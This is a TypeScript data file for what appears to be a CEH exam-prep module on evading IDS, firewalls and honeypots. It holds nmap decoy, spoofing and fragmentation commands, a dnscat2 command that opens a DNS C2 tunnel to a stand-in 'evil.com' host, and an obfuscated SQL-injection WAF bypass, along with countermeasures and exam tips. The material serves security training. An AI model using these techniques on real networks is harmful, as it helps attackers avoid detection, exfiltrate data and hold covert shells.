import type { Module } from '../cehModules';

export const m12: Module = {
  id: 'm12',
  number: 'M12',
  title: 'Evading IDS Firewalls and Honeypots',
  description: 'Master the techniques required to bypass enterprise perimeter security controls. Analyze the architectures of Intrusion Detection Systems (IDS), stateful Firewalls, Web Application Firewalls (WAF), and Honeypots. Learn evasion methodologies including IP fragmentation, source routing, protocol tunneling (DNS/ICMP), payload obfuscation, and decoy scanning to penetrate fortified network boundaries undetected.',
  examWeight: '5%',
  estimatedQuestions: 6,
  duration: '3h 00m',
  topics: [
    {
      id: 'm12-t01',
      title: 'IDS & Firewall Architectures',
      content: 'Intrusion Detection Systems (IDS) passively monitor traffic for malicious activity (generating alerts), while Intrusion Prevention Systems (IPS) actively sit inline and block it. Firewalls control the flow of traffic between networks based on strict security policies. Understanding how these devices inspect traffic is critical to bypassing them.',
      keyPoints: [
        'Signature-Based IDS (e.g., Snort): Compares traffic payloads against a database of known malicious patterns. Fails entirely against zero-days and obfuscated/encoded attacks.',
        'Anomaly-Based IDS: Establishes a baseline of normal network behavior and flags deviations. Can detect zero-days but generates a massive amount of false positives.',
        'Packet Filtering Firewall: Operates at Layer 3/4. Inspects IP addresses, ports, and protocols only. Vulnerable to IP spoofing.',
        'Stateful Inspection Firewall: Operates at Layer 4. Tracks the state of active connections (e.g., TCP 3-way handshake) and only allows packets that belong to an established, valid session.',
        'Application-Level Gateway (Proxy/WAF): Operates at Layer 7. Performs deep packet inspection of the application payload (e.g., HTTP headers, SQL queries). Essential for blocking modern web attacks.',
      ],
    },
    {
      id: 'm12-t02',
      title: 'Firewall Evasion & Tunneling',
      content: 'Firewalls generally operate by dropping traffic that violates their ruleset or ACLs. Evasion involves making malicious traffic look like permitted traffic, spoofing trusted IP addresses, or encapsulating malicious data inside allowed protocols (Tunneling).',
      commands: [
        { command: 'nmap -D RND:10 192.168.1.100', description: 'Decoy scan: mask the true source IP by generating simultaneous traffic from 10 random spoofed IPs' },
        { command: 'nmap --source-port 53 192.168.1.100', description: 'Source Port Spoofing: make traffic appear to originate from an allowed port (like DNS/53 or HTTP/80) to bypass poorly configured stateless firewalls' },
        { command: 'dnscat2 --dns domain=evil.com', description: 'Establish a Covert C2 Tunnel over DNS TXT records to completely bypass outbound firewall rules' },
      ],
      keyPoints: [
        'IP Spoofing: Forging the source IP in the packet header to bypass Access Control Lists (ACLs) that only allow traffic from trusted internal IPs.',
        'Source Routing: An IP header option allowing the sender to specify the exact route a packet should take, attempting to bypass firewall routing tables.',
        'Firewall Walking: Using TTL values (similar to traceroute) to systematically map out ACLs and determine exactly which ports are open behind a firewall.',
        'ICMP Tunneling / DNS Tunneling: Encapsulating malicious data, data exfiltration, or reverse shells inside allowed protocols (ICMP Echo requests or DNS TXT/A queries) to bypass port blocks.',
      ],
    },
    {
      id: 'm12-t03',
      title: 'IDS & IPS Evasion Techniques',
      content: 'IDS evasion focuses on altering the attack signature so it no longer matches the IDS database, altering the timing of the attack, or overwhelming the IDS resources so it drops packets (failing open or missing the attack entirely).',
      commands: [
        { command: 'nmap -f 192.168.1.100', description: 'Fragment the IP packets into tiny 8-byte chunks to bypass simple IDS signature matching' },
        { command: 'nmap --mtu 24 192.168.1.100', description: 'Specify a custom Maximum Transmission Unit to enforce specific fragmentation sizes' },
        { command: 'nmap --badsum 192.168.1.100', description: 'Send packets with invalid checksums. Firewalls may pass them without inspection, while the target OS drops them (revealing firewall behavior)' },
      ],
      keyPoints: [
        'Fragmentation: Splitting the attack payload across multiple overlapping IP fragments. If the IDS does not reassemble fragments before inspection (or reassembles them differently than the target Windows/Linux OS), the signature is missed.',
        'Obfuscation / Encoding: Encoding the payload (e.g., URL encoding, Base64, Unicode, polymorphic shellcode) so the raw text does not match the static IDS signature string.',
        'Session Splicing: Similar to fragmentation but at the application layer. Sending the attack payload extremely slowly, byte by byte, across multiple TCP packets to evade time-based signature windows.',
        'Encryption: Encapsulating the attack inside an SSL/TLS tunnel. Unless the IDS performs SSL decryption (SSL Offloading/Man-in-the-Middle), it cannot inspect the payload and must pass it.',
        'Resource Exhaustion: Flooding the IDS with massive amounts of noise or fake alerts, causing it to drop packets and miss the actual stealthy attack.',
      ],
    },
    {
      id: 'm12-t04',
      title: 'Honeypots & Active Defense',
      content: 'Honeypots are decoy systems deployed internally or externally to lure attackers, waste their time, and gather high-fidelity intelligence on their TTPs (Tactics, Techniques, and Procedures). Attackers must be able to identify honeypots to avoid alerting defenders.',
      keyPoints: [
        'Low-Interaction Honeypots: Simulate services and OS fingerprints but offer no real OS to interact with (e.g., Honeyd). Easily detected by sophisticated attackers because they lack complex functionality.',
        'High-Interaction Honeypots: Real operating systems and applications configured to be intentionally vulnerable (e.g., Cowrie for SSH brute-forcing). Provide high-quality intelligence but carry a severe risk of being used by the attacker to pivot if improperly isolated.',
        'Honeynet: A network of multiple honeypots simulating an entire enterprise environment, complete with fake Active Directory, databases, and user traffic.',
        'Detection: Honeypots often have tell-tale signs: too many open ports, unusual MAC addresses (OUIs indicating VMware/VirtualBox), lack of background traffic, default configurations, or predictable responses to complex protocol edge-cases.',
      ],
    },
  ],
  keyTools: ['Nmap', 'Fragroute', 'Snort', 'Honeyd', 'Kippo/Cowrie', 'Ptunnel', 'Dnscat2'],
  countermeasures: [
    'Implement a Defense-in-Depth strategy; do not rely solely on perimeter firewalls.',
    'Configure IDS/IPS to perform full IP defragmentation and TCP stream reassembly before inspecting signatures.',
    'Disable Source Routing on all routers and firewalls. Implement anti-spoofing controls (BCP38).',
    'Perform SSL/TLS Inspection (SSL Offloading) at the perimeter proxy to decrypt and inspect encrypted traffic for threats.',
    'Ensure IDS signature databases are updated continuously and supplemented with UEBA and anomaly-based detection.',
    'Deploy honeypots internally to detect attackers who have successfully bypassed perimeter defenses (adopting an assume-breach mentality).',
  ],
  examTips: [
    'Firewalls BLOCK traffic based on rules; IDS DETECTS traffic based on signatures; IPS BLOCKS traffic based on signatures.',
    'Packet filtering firewalls are state-less (Layer 3/4). Stateful firewalls track connection states (TCP handshakes).',
    'Fragmentation (`-f` in Nmap) is the primary technique for bypassing an IDS by breaking up the signature payload.',
    'Source port spoofing (`--source-port 53`) is a technique for bypassing stateless Firewalls.',
    'Honeypots are strictly for gathering intelligence and early warning; they are NOT a replacement for a firewall or IDS.',
    'Session Splicing is an IDS evasion technique that sends data very slowly to evade timing windows.',
  ],
  realWorldScenarios: [
    'During a red team engagement, a standard SQL injection payload (`UNION SELECT`) is blocked by the target\'s WAF. The attacker bypasses the signature by URL-encoding the payload and adding random inline SQL comments (`UN/**/ION SEL/**/ECT`), successfully extracting the database.',
    'An attacker establishes a reverse shell from a compromised internal server. Because the outbound firewall blocks all ports except 53 (DNS), the attacker uses `dnscat2` to tunnel the interactive shell over legitimate-looking DNS TXT queries, completely bypassing the port restrictions.',
    'You are scanning a target network and find a server with 500+ open ports, including Telnet, FTP, and older vulnerable services. The server responds identically and almost instantaneously to every banner grab attempt. You identify it as a low-interaction honeypot and blacklist the IP to avoid alerting the SOC.',
  ],
  prerequisites: ['M03 — Understanding of TCP/IP packets and Nmap scanning techniques is absolutely required to understand fragmentation and spoofing.'],
};
